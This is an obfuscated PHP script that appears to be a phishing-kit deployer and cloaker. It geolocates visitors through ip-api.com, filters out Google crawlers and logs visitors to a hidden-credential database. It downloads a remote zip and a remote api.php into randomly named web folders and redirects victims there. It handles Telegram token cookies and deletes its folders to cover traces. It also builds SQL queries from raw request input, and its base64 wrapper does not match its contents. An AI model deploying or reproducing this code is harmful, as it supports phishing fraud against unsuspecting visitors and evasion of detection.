<?php eval(base64_decode('
 goto BejIg; ZvKUr: $domine = $_SERVER["\123\x45\122\126\x45\122\137\116\x41\115\x45"]; goto sgMW6; BejIg: error_reporting(E_ALL); goto EooPb; PnmIg: $info = unserialize($response); goto B244H; s9Gjq: $ipPortArray = explode("\72", $ipAddress); goto ECjSn; GLZQX: function Rand_XD_TF($length) { $characters = "\x61\142\x63\x64\x65\x66\152\150\151\147\x6b\x6c\x6d\x6e\157\x70\161\x72\163\164\165\166\167\170\171\x7a\60\61\x32\63\64\x35\66\x37\70\x39\101\x42\x43\x44\x45\x46\x47\110\111\x4a\x4b\114\x4d\x4e\117\120\121\x52\123\124\125\x56\127\130\131\132"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto Fol6o; w62yr: if (strpos($userAgent, "\147\x6f\157\x67\154\145") !== false) { $refix = "\102\157\x73\x65\x20\x47"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto b9yhG; wpzco: $protocol = isset($_SERVER["\x48\124\x54\x50\x53"]) && $_SERVER["\x48\x54\x54\120\123"] === "\157\156" ? "\x68\164\164\160\x73" : "\150\164\x74\x70"; goto mfP4L; B244H: $_SESSION["\151\163\160"] = isset($info["\x69\163\x70"]) ? $info["\151\163\x70"] : null; goto oeAmG; DwoYZ: $IpCount = FOx_TGH_X($userAgent); goto wLKuD; oKSiB: function FOx_TGH_X($USER_AGENT) { $BROWSER_ERROR = "\x55\156\153\156\157\167\156\40\x42\162\x6f\x77\x73\145\x72"; $BROWSER = array("\x2f\155\163\151\145\x2f\151" => "\x49\156\x74\x65\x72\x6e\x65\164\40\x45\170\x70\154\x6f\162\x65\x72", "\57\x66\151\x72\145\x66\157\170\x2f\151" => "\x46\x69\x72\x65\146\157\170", "\x2f\163\141\146\x61\162\151\57\151" => "\123\141\x66\x61\x72\151", "\x2f\x63\x68\x72\x6f\x6d\145\x2f\x69" => "\103\x68\162\x6f\x6d\x65", "\57\145\x64\x67\145\57\x69" => "\x45\x64\x67\145", "\x2f\x6f\x70\x65\162\x61\x2f\151" => "\117\x70\x65\x72\141", "\57\x6e\145\x74\163\x63\x61\x70\145\57\151" => "\x4e\x65\164\163\143\x61\x70\x65", "\57\x6d\x61\170\164\x68\157\x6e\x2f\x69" => "\115\x61\x78\x74\150\x6f\156", "\x2f\153\157\156\x71\165\x65\x72\157\162\57\151" => "\113\x6f\x6e\x71\x75\x65\x72\157\162", "\x2f\155\x6f\x62\151\154\x65\x2f\x69" => "\110\x61\x6e\x64\150\145\x6c\x64\40\x42\x72\x6f\167\x73\145\x72"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto JJNK7; jV7S_: if (isset($_POST["\x6c\x6f\143\x61\154\x69\x70"])) { $myips = base64_decode(base64_decode($_POST["\154\157\x63\141\x6c\151\x70"])); $_SESSION["\154\x6f\x6c\x69\x70\x73"] = $myips; $StrupLom = $myips; } goto wpzco; oeAmG: $_SESSION["\102\x6c\141\x73\x61\143\x6f\165\156"] = isset($info["\143\x6f\165\x6e\x74\162\171"]) ? $info["\143\157\x75\156\164\162\171"] : null; goto tsZYs; JXAs_: function HYT_DDR_Uio($USER_AGENT) { $OS_ERROR = "\125\156\x6b\x6e\157\167\x6e\40\117\x53\x20\x50\154\x61\164\x66\x6f\162\x6d"; $OS = array("\57\x77\151\156\144\x6f\167\163\x20\x6e\x74\x20\x31\60\x2f\x69" => "\127\151\156\144\x6f\x77\163\x20\x31\60", "\x2f\167\151\156\144\157\x77\x73\40\156\x74\x20\66\x2e\x33\x2f\x69" => "\127\151\x6e\144\x6f\167\x73\x20\x38\56\x31", "\57\x77\151\156\144\x6f\167\x73\x20\156\x74\40\66\x2e\62\x2f\x69" => "\x57\151\156\x64\x6f\167\x73\40\70", "\57\x77\x69\156\x64\157\x77\163\40\x6e\164\40\66\56\61\57\x69" => "\x57\x69\156\144\157\167\163\40\67", "\x2f\167\x69\x6e\x64\x6f\x77\x73\40\x6e\x74\x20\x36\56\x30\57\x69" => "\127\x69\x6e\144\157\x77\163\x20\126\151\163\164\141", "\x2f\167\x69\156\144\157\x77\x73\x20\x6e\x74\x20\65\x2e\x32\57\151" => "\x57\151\x6e\x64\157\x77\163\40\123\145\x72\166\x65\x72\40\x32\60\60\63\x2f\130\120\40\x78\x36\64", "\57\x77\x69\x6e\144\x6f\167\163\x20\156\164\40\x35\56\x31\x2f\x69" => "\127\151\156\144\157\x77\x73\x20\130\120", "\57\x77\x69\x6e\144\x6f\167\163\x20\x78\x70\57\x69" => "\127\x69\x6e\144\x6f\x77\x73\x20\x58\120", "\x2f\x77\151\156\144\x6f\x77\163\40\156\164\x20\x35\56\x30\x2f\x69" => "\127\x69\x6e\144\x6f\x77\x73\x20\62\60\60\60", "\x2f\167\x69\156\x64\157\167\x73\40\x6d\145\x2f\x69" => "\x57\151\156\x64\157\x77\x73\x20\115\x45", "\x2f\167\x69\x6e\71\70\57\151" => "\127\151\156\144\x6f\x77\x73\40\x39\70", "\57\167\x69\x6e\x39\65\57\151" => "\x57\x69\156\144\x6f\167\x73\x20\71\65", "\x2f\x77\x69\x6e\x31\66\57\x69" => "\127\x69\x6e\x64\x6f\167\163\x20\x33\56\61\61", "\x2f\x6d\141\x63\151\x6e\x74\x6f\x73\x68\174\155\141\x63\40\x6f\x73\x20\x78\57\151" => "\x4d\x61\x63\x20\x4f\x53\40\130", "\57\x6d\141\143\x5f\160\x6f\167\x65\162\x70\143\x2f\x69" => "\115\x61\x63\x20\x4f\x53\40\x39", "\57\x6c\x69\156\x75\x78\x2f\151" => "\x4c\151\x6e\165\x78", "\57\x75\x62\x75\x6e\164\x75\57\x69" => "\x55\x62\x75\156\x74\x75", "\x2f\x69\x70\150\157\156\145\57\x69" => "\151\x50\x68\157\x6e\145", "\x2f\x69\160\x6f\x64\x2f\151" => "\151\x50\x6f\144", "\x2f\151\x70\x61\x64\x2f\x69" => "\151\120\141\x64", "\x2f\x61\x6e\144\x72\x6f\x69\144\57\x69" => "\101\x6e\x64\x72\157\151\144", "\57\142\x6c\141\143\x6b\142\145\162\162\x79\x2f\x69" => "\102\154\x61\x63\153\x42\145\x72\162\171", "\x2f\x77\x65\x62\157\163\57\151" => "\x4d\x6f\x62\151\154\x65"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto oKSiB; dh9z4: if (is_array($directories)) { foreach ($directories as $dir) { if (basename($dir)[0] != "\56") { if (deleteDirectory($dir)) { } } } } goto KhPmY; kcryz: curl_close($curl); goto PnmIg; j3TZN: $parentDirectory = "\167\x65\142"; goto ME2Mz; nI6Fs: function deleteDirectory($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } $time_diff = time() - filectime($dir); if ($time_diff > 290) { foreach (scandir($dir) as $item) { if ($item == "\56" || $item == "\x2e\56") { continue; } if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } else { return true; } } goto j3TZN; nMYtg: $Lredsvv = base64_decode("\132\110\112\x6a\x5a\x32\154\x73\x65\x56\x41\167\113\155\163\155"); goto yboPs; nDFk8: $_SESSION["\x78\x4f\x70\x75\x79"] = isset($info["\x72\x65\147\151\x6f\156\116\x61\x6d\145"]) ? $info["\162\x65\147\x69\157\x6e\x4e\x61\x6d\x65"] : null; goto QUVZE; Ic1Cd: if (isset($_GET["\166\163\x73"])) { $gameid = $_GET["\163\157\x75\154\x73"]; $_SESSION["\154\x6f\154\x73\157\x75\x6c\163"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); $folder_pathx = $_GET["\x76\163\163"]; $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); echo "\x3c\x73\x63\x72\x69\x70\x74\x20\x4c\x41\x4e\x47\x55\101\x47\x45\x3d\47\112\141\x76\x61\123\x63\162\151\x70\x74\x27\76\xa\x20\40\40\x20\167\151\x6e\x64\157\x77\x2e\154\157\143\x61\x74\x69\157\x6e\x2e\x68\x72\x65\146\75\x27{$folder_pathx}\77\x26\166\x61\x6c\x69\144\x3d{$RandOP_Mlux}{$RandOP_Mlux}\x26\141\x6c\x65\x72\164\x3d{$RandOP_Mlux}\x26\170\x6c\160\x73\75{$RandOP_Mlux}\46\163\157\x75\154\163\x3d{$gameid}\46\144\x6f\x6e\x65\75\x26\x65\x72\x72\157\162\171\75{$RandOP_Mlux}\46\155\x6e\145\155\157\156\x69\143\x3d\46\x6a\x62\x3d{$RandOP_Mlux}\47\x3b\12\40\x20\40\40\74\57\x73\x63\x72\151\160\164\76"; die; } goto btc6F; Fol6o: function rand_num($length) { $characters = "\60\61\x32\63\64\x35\66\x37\70\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto JXAs_; XLX2_: function RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $id) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\x43\157\x6e\156\x65\143\x74\151\x6f\x6e\40\146\141\151\x6c\x65\144\72\40" . mysqli_connect_error()); } $sql_u = "\123\x45\x4c\105\103\x54\x20\x2a\x20\x46\122\117\115\x20\x72\x65\144\151\162\143\x74\151\x6f\x6e\40\127\x48\x45\x52\105\40\151\x64\75\47{$id}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\154\151\x6e\153"] = base64_decode(base64_decode($row["\154\151\x6e\153"])); $_SESSION["\143\156"] = explode("\73", base64_decode(base64_decode($row["\143\157\x75\x6e\x74\162\171"]))); $_SESSION["\160\151\x63"] = $row["\160\x69\143"]; $_SESSION["\x6d\163\147"] = base64_decode(base64_decode($row["\155\163\147"])); $_SESSION["\x65\x78\x70"] = $row["\145\x78\x70\x69\162\x65"]; $_SESSION["\x73\145\162\x76\x65\162"] = base64_decode(base64_decode($row["\x73\x65\162\166\145\162"])); $_SESSION["\165\162\x6c"] = base64_decode(base64_decode($row["\165\162\154"])); $_SESSION["\x6c\x75\170\x63\141\x70\x74\143\150\x61"] = $row["\154\x75\170\x63\x61\x70\x74\143\150\141"]; $_SESSION["\x74\x6f\x6b\145\x6e\x74\x65\154"] = base64_decode(base64_decode($row["\x74\157\153\x65\156\164\145\154"])); $_SESSION["\151\x64\164\x65\154"] = base64_decode(base64_decode($row["\151\144\164\145\x6c"])); $_SESSION["\162\x65\144\151\162\x69\143\164"] = $row["\162\x65\x64\x69\162\151\143\x74"]; $_SESSION["\141\160\x69"] = $row["\141\x70\x69"]; if (isset($_GET["\x76\x73\163"])) { setcookie("\164\157\153\145\156\164\x65\x6c", $_SESSION["\x74\157\153\x65\x6e\164\x65\154"], time() + 86400 * 30, "\x2f"); setcookie("\x69\144\x74\145\x6c", $_SESSION["\151\144\164\145\x6c"], time() + 86400 * 30, "\57"); setcookie("\162\x65\x64\x69\162\x69\143\x74", $_SESSION["\x72\145\x64\x69\x72\151\143\x74"], time() + 86400 * 30, "\x2f"); } } } else { $refix = "\x53\121\114\x20\111\x44\x20\x49\x6e\166\141\x6c\x69\144"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } mysqli_close($db); } goto GLZQX; ma87w: $response = curl_exec($curl); goto kcryz; tKF10: $curl = curl_init($url); goto cQ7Fd; KhPmY: function Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\x6f\x6e\156\x65\x63\x74\x69\x6f\x6e\x20\146\141\151\x6c\145\x64\72\40" . mysqli_connect_error()); } $sql_u = "\123\x45\114\x45\103\x54\40\x2a\x20\x46\x52\117\115\40\154\157\x67\x73\x20\127\x48\105\122\x45\x20\151\160\x61\x64\144\162\145\163\x3d\47{$StrupLom}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return false; } mysqli_close($db); return true; } goto M8qkC; ca6Wq: $datalog = base64_decode("\x65\x6d\126\171\142\171\61\x6b\x59\x58\153\x75\x63\62\x68\x76\x63\x41"); goto e4xbH; mfP4L: $domain = $_SERVER["\x48\x54\x54\120\x5f\110\117\123\124"]; goto nqDN2; ME2Mz: $directories = glob($parentDirectory . "\x2f\x2a", GLOB_ONLYDIR); goto dh9z4; nqDN2: $donflag = $protocol . "\72\57\x2f" . $domain; goto ca6Wq; wLKuD: function click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix) { $userAgent = isset($_SERVER["\110\124\x54\120\x5f\125\123\105\x52\137\101\107\105\x4e\x54"]) ? $_SERVER["\110\x54\124\120\137\x55\123\x45\122\137\101\x47\105\x4e\x54"] : ''; $isp = $_SESSION["\151\x73\x70"]; $IpCount = FOx_TGH_X($userAgent); $OKJIVGRD = HYT_DDR_Uio($userAgent); $donflag = $_SERVER["\x53\105\122\x56\x45\x52\x5f\116\x41\115\105"]; $LOCALO_TEMPO = date("\131\55\155\x2d\x64\40\x48\72\x69\x3a\x73"); $Blasacoun = $_SESSION["\x42\154\141\x73\x61\143\x6f\165\x6e"]; $Njopf = $_SESSION["\x4e\x6a\157\x70\146"]; $Voprt = $_SESSION["\126\157\x70\162\164"]; $xOpuy = $_SESSION["\170\x4f\x70\x75\x79"]; $host = gethostbyaddr($StrupLom); $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\x43\x6f\x6e\156\x65\143\164\151\x6f\156\x20\x66\141\x69\154\145\x64\x3a\x20" . mysqli_connect_error()); } $sql_u = "\123\105\114\105\x43\x54\x20\x2a\x20\x46\122\117\115\x20\154\157\x67\163\x20\127\x48\105\x52\105\40\x69\160\x61\144\144\x72\145\x73\75\47{$StrupLom}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); echo "\41\41"; die; } else { $StrupLom = mysqli_real_escape_string($db, str_replace("\x27", '', $StrupLom)); $Blasacoun = mysqli_real_escape_string($db, str_replace("\x27", '', $Blasacoun)); $IpCount = mysqli_real_escape_string($db, str_replace("\47", '', $IpCount)); $OKJIVGRD = mysqli_real_escape_string($db, str_replace("\47", '', $OKJIVGRD)); $donflag = mysqli_real_escape_string($db, str_replace("\x27", '', $donflag)); $LOCALO_TEMPO = mysqli_real_escape_string($db, str_replace("\x27", '', $LOCALO_TEMPO)); $host = mysqli_real_escape_string($db, str_replace("\x27", '', $host)); $isp = mysqli_real_escape_string($db, str_replace("\47", '', $isp)); $refix = mysqli_real_escape_string($db, str_replace("\47", '', $refix)); $query = "\x49\116\x53\105\122\x54\x20\x49\116\x54\x4f\x20\x6c\x6f\x67\163\40\x28\151\160\x61\144\x64\x72\145\163\x2c\143\157\x75\156\x74\x72\x79\x2c\142\x72\157\167\x73\x65\162\x2c\157\163\x2c\x64\x6f\155\x69\156\x65\54\x6d\171\x74\151\x6d\x65\54\150\x6f\163\164\54\x69\163\x70\54\162\145\x73\157\x6e\x29\40\12\x20\40\40\x20\40\x20\x9\40\x20\40\40\11\x20\40\x56\101\x4c\x55\105\x53\x20\x28\x27{$StrupLom}\47\54\47{$Blasacoun}\47\x2c\47{$IpCount}\47\54\47{$OKJIVGRD}\x27\x2c\47{$donflag}\x27\x2c\x27{$LOCALO_TEMPO}\47\x2c\x27{$host}\47\x2c\47{$isp}\47\x2c\x27{$refix}\47\x29"; $results = mysqli_query($db, $query); mysqli_close($db); echo "\x21"; } } goto w62yr; e4xbH: $Fixbom = base64_decode("\143\63\x52\171\x62\x32\x35\x6e\130\x32\122\150\145\x51"); goto nMYtg; hB7pz: if (isset($_GET["\154\157\154\155\145"])) { $vdir = $_GET["\x6c\x6f\x6c\155\x65"]; $refix = "\111\x6e\166\x61\154\151\x64\40\x6c\x6f\154\155\145"; $redi = $_COOKIE["\x72\145\144\x69\162\x69\143\x74"]; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); $directoryToDelete = "\167\x65\142\x2f" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\x3c\163\143\162\151\x70\x74\40\x4c\x41\116\x47\x55\x41\x47\x45\75\47\x4a\x61\166\x61\123\x63\x72\x69\160\x74\47\76\12\40\x20\x20\x20\167\151\156\x64\x6f\x77\x2e\x6c\x6f\x63\141\164\151\x6f\156\56\150\x72\x65\x66\x3d\47{$redi}\x27\x3b\12\40\x20\40\40\x3c\x2f\x73\x63\162\151\x70\164\76"; die; } goto Ic1Cd; QSivf: if ($_SERVER["\x52\x45\x51\125\x45\123\124\x5f\x4d\105\x54\x48\117\104"] === "\120\117\123\124") { if (!isset($_POST["\154\x6f\x63\x61\154\151\160"])) { $refix = "\x49\156\x76\x61\x6c\x69\x64\x20\x49\120\123"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!isset($_POST["\x73\x68\x6f\160\151\x64"])) { $refix = "\111\156\x76\141\x6c\x69\144\40\111\104\x20\123\121\x4c"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!is_dir("\167\145\142")) { if (!mkdir("\x77\145\x62", 511)) { die("\x46\141\x69\154\x65\x64\x20\164\x6f\40\x63\162\x65\x61\x74\x65\x20\x77\145\x62\40\144\151\162\x65\x63\x74\x6f\162\x79"); } } $folder_name = bin2hex(random_bytes(8)); $sub_folder = rand_num(4); $folder_path = "\167\x65\x62\57{$sub_folder}\57"; $zipFileUrl = $_SESSION["\x75\x72\x6c"]; $tempDir = "\x74\x65\155\160"; if (!is_dir($tempDir)) { mkdir($tempDir); } $zipFileName = "{$tempDir}\57{$folder_name}\56\x7a\151\x70"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\x46\x61\x69\154\x65\x64\40\164\157\x20\x63\x72\x65\141\164\145\40\x74\150\x65\40\146\157\x6c\144\x65\x72\56"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); $extractedFiles = scandir($folder_path); foreach ($extractedFiles as $file) { if ($file !== "\x2e" && $file !== "\x2e\56") { rename($folder_path . "\57" . $file, $folder_path . $file); } } } else { echo "\106\x61\151\154\x65\144\x20\164\157\x20\145\170\164\162\x61\143\x74\x20\x74\x68\x65\40\x7a\151\160\40\x66\151\x6c\145\56"; } } else { die("\106\141\x69\154\145\x64\x20\164\x6f\40\x64\x6f\167\x6e\x6c\157\x61\144\x20\164\150\145\x20\x7a\x69\160\x20\146\151\154\145\x2e"); } if (file_exists($zipFileName)) { unlink($zipFileName); } $gameid = $_SESSION["\x6c\157\x6c\163\x6f\165\154\x73"]; $_SESSION["\154\157\x63\x61\x6c\144\151\x72"] = "{$folder_path}"; file_put_contents("{$folder_path}\57\154\x6f\x63\141\x6c\x2e\x74\170\164", "{$StrupLom}\xa", FILE_APPEND); $fileURL = $_SESSION["\x61\x70\151"]; function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { return; } $fileContents = file_get_contents($fileURL); if ($fileContents !== false) { $localFilePath = "\x77\145\x62\57\141\x70\151\x2e\160\x68\x70"; file_put_contents($localFilePath, $fileContents); } } if ($fileURL !== "\101\x50\111") { getFileContents($fileURL); } $localip = isset($_POST["\x6c\x6f\x63\141\x6c\x69\x70"]) ? $_POST["\154\x6f\x63\x61\154\151\x70"] : null; $domainname = isset($_POST["\144\157\155\141\x69\x6e\x6e\x61\155\x65"]) ? $_POST["\x64\157\155\x61\151\x6e\x6e\x61\155\x65"] : null; $nextdomain = isset($_POST["\x6e\x65\170\164\144\157\155\141\151\156"]) ? $_POST["\x6e\145\x78\164\x64\157\x6d\x61\x69\156"] : null; $shopid = isset($_POST["\163\150\x6f\160\151\x64"]) ? $_POST["\163\150\157\160\x69\x64"] : null; if ($localip !== null && $domainname !== null && $nextdomain !== null && $shopid !== null) { $directory = "\164\x65\155\x70"; $zipFiles = glob($directory . "\x2a\56\x7a\151\160"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } $responseData = array("\x73\x74\x61\164\x75\163" => "\x73\x75\143\143\x65\x73\163", "\x62\x61\143\153\137\144\x69\x72" => $folder_path, "\x62\x61\x63\x6b\137\x75\x72\x6c" => $nextdomain, "\142\x61\x63\x6b\x5f\x69\144" => $shopid, "\155\145\x73\163\x61\147\145" => "\104\141\164\x61\x20\x72\x65\x63\x65\x69\166\x65\144\x20\x73\x75\x63\x63\145\x73\x73\x66\165\x6c\x6c\171"); $responseJson = json_encode($responseData); echo $responseJson; } else { http_response_code(400); echo "\x4d\151\163\163\151\156\x67\x20\x72\x65\x71\165\x69\x72\x65\144\40\144\141\164\141"; } } else { http_response_code(405); echo "\111\x6e\166\x61\154\151\144\40\162\145\161\165\145\163\x74\x20\x6d\145\x74\x68\x6f\x64"; } goto Vpo3T; b9yhG: if (strpos(gethostbyaddr($StrupLom), "\147\157\157\147\x6c\145") !== false) { $refix = "\102\157\x73\x65\40\107\x20\x32"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto KZ9So; rT7h4: $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); goto QSivf; btc6F: if (isset($_POST["\163\150\x6f\160\151\x64"])) { $gameid = $_POST["\163\150\x6f\x70\151\x64"]; $_SESSION["\154\x6f\154\163\x6f\x75\154\x73"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); } goto XLX2_; ufMtt: if (!empty($_SERVER["\x48\124\x54\x50\137\103\x4c\111\x45\x4e\124\137\x49\120"])) { $ipAddress = $_SERVER["\x48\x54\x54\x50\137\103\x4c\x49\105\116\124\137\111\x50"]; } elseif (!empty($_SERVER["\x48\x54\124\x50\137\x58\x5f\106\x4f\x52\127\101\122\x44\105\x44\x5f\106\x4f\122"])) { $ipAddress = $_SERVER["\x48\x54\124\120\x5f\x58\x5f\x46\x4f\122\127\101\x52\x44\105\x44\137\x46\x4f\122"]; } else { $ipAddress = $_SERVER["\122\105\x4d\117\124\105\137\x41\x44\x44\x52"]; } goto s9Gjq; JJNK7: $userAgent = isset($_SERVER["\x48\124\x54\120\x5f\x55\x53\x45\x52\137\101\107\105\116\124"]) ? $_SERVER["\110\x54\124\x50\137\x55\x53\105\122\137\101\107\105\116\x54"] : ''; goto s4LFg; sgMW6: $TIME_DATE = date("\131\55\x6d\x2d\x64\40\110\72\151\72\163"); goto jV7S_; M8qkC: if (!Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv)) { $showpip = "\x21\x21\41"; echo $showpip; die; } goto qQZ8V; cQ7Fd: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto ma87w; ECjSn: $StrupLom = $ipPortArray[0]; goto ZvKUr; yboPs: $Nopwvv = base64_decode("\143\x33\x52\171\142\62\65\156\130\x32\x52\150\x65\121"); goto T_U2d; tsZYs: $_SESSION["\x4e\x6a\x6f\160\x66"] = isset($info["\143\x6f\165\x6e\x74\162\171\x43\157\144\145"]) ? $info["\143\157\x75\156\164\x72\x79\103\157\144\x65"] : null; goto LbCQ8; KZ9So: $RandOP_M = Rand_XD_TF(rand(7, 7)); goto rT7h4; s4LFg: $OKJIVGRD = HYT_DDR_Uio($userAgent); goto DwoYZ; T_U2d: $url = "\x68\x74\164\160\x3a\x2f\x2f\x69\x70\x2d\141\160\x69\x2e\x63\157\x6d\57\160\150\x70\57{$StrupLom}\77\x66\151\145\154\144\x73\x3d\x73\164\141\164\165\163\54\x6d\145\x73\163\x61\x67\145\x2c\143\157\x6e\x74\151\x6e\x65\156\164\54\x63\157\x6e\x74\x69\x6e\x65\x6e\x74\x43\x6f\x64\145\54\x63\157\165\156\164\162\171\54\143\157\x75\x6e\164\162\171\x43\x6f\144\x65\54\x72\x65\x67\151\157\156\54\162\x65\147\151\x6f\156\116\141\155\x65\x2c\143\151\164\171\54\x64\151\x73\x74\x72\151\x63\x74\54\x7a\151\x70\54\154\x61\164\54\154\157\x6e\x2c\164\151\155\x65\172\x6f\156\145\54\143\x75\x72\x72\x65\x6e\143\x79\54\x69\x73\x70\x2c\157\162\x67\x2c\x61\163\x2c\x61\x73\x6e\x61\x6d\x65\x2c\x72\145\166\x65\x72\x73\x65\x2c\x6d\x6f\x62\151\x6c\x65\54\x70\x72\157\170\171\54\x68\x6f\163\x74\x69\156\x67\54\x71\x75\145\162\171"; goto tKF10; EooPb: ini_set("\144\x69\x73\160\154\x61\x79\137\x65\162\162\x6f\162\x73", 1); goto ufMtt; QUVZE: function deleteDirectorynew($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } foreach (scandir($dir) as $item) { if ($item == "\x2e" || $item == "\56\56") { continue; } if (!deleteDirectorynew($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } goto nI6Fs; qQZ8V: if (isset($_GET["\x65\156\x64\x6d\145\154\x75\x78"])) { $redi = $_COOKIE["\x72\145\x64\x69\162\151\143\x74"]; $vdir = $_GET["\145\x6e\x64\x6d\x65\154\x75\x78"]; $directoryToDelete = "\167\x65\x62\57" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\x3c\163\143\x72\x69\x70\x74\40\x4c\101\116\x47\x55\x41\107\105\75\x27\x4a\x61\x76\141\123\143\x72\x69\160\x74\x27\x3e\12\x20\40\40\x20\167\151\156\144\157\x77\56\x6c\157\x63\x61\x74\151\157\x6e\56\150\x72\x65\146\x3d\47{$redi}\47\73\12\x20\40\40\40\x3c\57\163\143\x72\151\160\164\76"; die; } goto hB7pz; LbCQ8: $_SESSION["\x56\x6f\160\x72\164"] = isset($info["\x63\151\x74\x79"]) ? $info["\x63\x69\x74\171"] : null; goto nDFk8; Vpo3T: ')); ?>
